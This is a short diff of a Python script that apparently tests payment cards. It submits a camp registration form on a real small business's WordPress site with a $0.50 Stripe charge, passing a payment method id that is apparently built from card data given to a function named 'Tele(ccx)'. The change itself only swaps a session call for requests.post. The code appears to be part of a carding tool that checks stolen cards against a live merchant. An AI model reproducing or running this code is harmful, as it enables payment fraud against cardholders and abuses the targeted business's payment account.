@@ -55,7 +55,7 @@ def Tele(ccx):
 	
 	data = f'data=__fluent_form_embded_post_id%3D10541%26_fluentform_10_fluentformnonce%3D310c97a01a%26_wp_http_referer%3D%252Fchandelle-soccer-camp-registration%252F%26Parent_name%3DRodam%2520User%26Email_Address%3Drodamuser07%2540gmail.com%26Phone_Number%3D43003000890%26Childs_Name%255B0%255D%255B%255D%3DRodam%2520User%26Childs_Name%255B0%255D%255B%255D%3D20%26Emergency_Contact_Name%3DRodam%2520User%26Phone_Number_1%3D4303000890%26Camp_selection%3DHalf%2520Day%2520Camp%26input_text%3DJune%25207%252C%25202025%2520(9%253A00%2520AM%2520%25E2%2580%2593%252012%253A00%2520PM)%26Location%3D1140%2520W%2520Alameda%2520Dr%2520Suite%25201%252C%2520Tempe%252C%2520AZ%252085282%26custom-payment-amount%3D0.50%26payment_method%3Dstripe%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=10'
 	
-	response = session.post(
+	response = requests.post(
 	    'https://chandellesoccer.com/wp-admin/admin-ajax.php',
 	    params=params,
 	    headers=headers,
